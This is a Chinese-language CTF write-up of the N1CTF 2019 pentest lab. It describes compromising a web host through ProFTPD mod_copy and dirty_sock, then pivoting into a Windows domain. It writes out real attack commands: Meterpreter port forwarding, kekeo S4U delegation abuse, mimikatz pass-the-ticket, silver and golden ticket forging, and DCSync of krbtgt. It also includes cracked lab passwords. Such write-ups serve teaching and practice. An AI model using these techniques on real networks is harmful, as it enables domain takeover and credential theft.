---
layout: post
title: Pentest N1CTF2019.lab WP
category: writeup
tags: ctf,n1ctf,nu1l
description:
---

# N1CTF 2019 Pentest N1ctf2019.lab WP


攻击web.n1ctf2019.lab

![attack.jpg][1]

通过端口探测之后发现跑着ProFTPD和Apache.

这里有个因为安全组的问题就开放了21，80端口所以需要ftp的主动模式，然后可以得知ftp目录也是web目录。
通过搜索可知ProFTPD 1.3.5中的mod_copy模块允许远程攻击者通过站点cpfr和site cpto命令读取和写入任意文件。

http://bugs.proftpd.org/show_bug.cgi?id=4372

![nmapscanner.jpg][2]

权限提升：
https://www.cvedetails.com/cve/CVE-2019-11503/
https://github.com/initstring/dirty_sock
通过分析安装的软件,可以很容易的发现snap版本过低。
![ftp][3]


![curl][4]

在这里很多师傅前面都是上的车，23333无关紧要，因为这个入口原本是没有flag的，想了想还是送一个比较好。然后，就被搅了。在这里给真正想要做题的大佬们陪个不是，因为个人考虑不周，导致游戏体验极差，真的非常对不起！在这里表扬一下vk师傅，接下来就开始走起很多师傅卡住的地方。

权限提升拿到root.然后通过信息收集（扫c段）可以发现内网中存在一个开放80端口的机器。

攻击：dev.n1ctf2019.lab

可能会有这三种方法得到dev的权限。

1.文件读取UNC netntlmv2破解

使用msf在dmz的linux上转发端口，来转发SMB的流量到我们的捕获器中。msf 开启一个socks4a代理，来对dev服务器进行攻击。

portfwd add -R -L 127.0.0.1 -l 5555 -p 445

使用msf中的auxiliary/server/capture/smb模块。
![-w856](media/15649226152078/15651630547989.jpg)

利用John the Ripper加载字典进行猜解，得到administrator明文为P4ssw0rd
![-w918](media/15649226152078/15650918312061.jpg)

2.smb login爆破administrator 密码。

3.任意文件读取log，上其他人的车。

然后利用msf的socks4a代理psexec攻击devServer.

![-w892](media/15649226152078/15679216595246.jpg)

很容易的在devServer上发现有一个域用户。然后盗取凭证，对dc.n1ctf2019.lab进行侦查。

![-w1289](media/15649226152078/15651633702329.jpg)

你可以使用incognito，也可以进程迁移。在这里因为网络原因可能会导致迁移超时session挂掉，可以多打几次大力出奇迹。

![-w372](media/15649226152078/15679463778175.jpg)

使用PowerView进行信息收集
![-w847](media/15649226152078/15651638473027.jpg)

对域进行侦查可以很容易的知道域内存在backupserver 以及一个共享的备份文件夹。

![-w536](media/15649226152078/15651639972058.jpg)

其中有DCServer和DevServer的备份，并且划分了相应权限。

![-w666](media/15649226152078/15651645109120.jpg)

攻击backup.n1ctf2019.lab

通过域侦查可以得知存在约束委派攻击。(服务通过S4U2Self和s4u2proxy来请求身份验证服务为任意用户生成TGS具体参考:https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)

![-w878](media/15649226152078/15679219145966.jpg)

通过kerberoast 攻击得到服务账号明文，首先使用Invoke-Kerberoast得到SPN的密文，然后使用hashcat进行破解得到明文为P@ssword123

![-w993](media/15649226152078/15679466343904.jpg)

约束委派攻击：
可以使用kekeo，mimikatz或者rubeus来获取票据凭证。这里使用的kekeo来进行攻击。

kekeo:
tgt::ask /domain:n1ctf2019.lab /user:backupuser /password:P@ssword123

![-w675](media/15649226152078/15679467659265.jpg)


tgs::s4u /tgt:TGT_backupuser@n1ctf2019.lab_krbtgt~n1ctf2019.lab@n1ctf2019.lab.kirbi /user:administrator /service:cifs/backup.n1ctf2019.lab

![-w659](media/15649226152078/15679481882397.jpg)

然后使用mimikatz将票据导入内存。
kerberos::ptt 
TGS_administrator@n1ctf2019.lab_backupUser@n1ctf2019.lab.kirbi

kerberos::ptt TGS_administrator@n1ctf2019.lab_cifs~backup.n1ctf2019.lab@n1ctf2019.lab.kirbi

![-w649](media/15649226152078/15679483392050.jpg)

![-w604](media/15649226152078/15679484107077.jpg)

攻击dc.n1ctf2019.lab 

在backupfile中发现存在注册表备份，于是使用impacket套件的secretsdump.py

![-w839](media/15649226152078/15650221396670.jpg)
可以得到sam中的密码，只有计算机用户有效，然后可以通过Silver Ticket来获得dc的权限。

伪造一个Silver ticket需要以下信息：
* 域SID
* service
* rc4

kerberos::golden /domain:n1ctf2019.lab /sid:S-1-5-21-1962069583-682474415-2983424938 /target:dc.n1ctf2019.lab /rc4:3776b07886526b9a060a7edc8b426de1 /service:cifs /user:Nu1L /ptt

![-w653](media/15649226152078/15679480427890.jpg)


然后在桌面拿到flag.txt

![-w657](media/15649226152078/15679484480497.jpg)


然后还可以选择将Silver Ticket升级为golden ticket。

kerberos::golden /domain:n1ctf2019.lab /sid:S-1-5-21-1962069583-682474415-2983424938/target:dc.n1ctf2019.lab /rc4:3776b07886526b9a060a7edc8b426de1 /service:ldap /user:Nu1L /ptt

lsadump::dcsync /dc:dc.n1ctf2019.lab /domain:n1ctf2019.lab /user:krbtgt

然后使用kerberos::golden生成金票，拿到flag。

[1]: https://img.scanfsec.com/img/20190908233048.jpg

[2]: https://img.scanfsec.com/img/20190908231844.jpg

[3]: https://img.scanfsec.com/img/20190908233258.jpg

[4]: https://https://img.scanfsec.com/img/20190908233317.jpg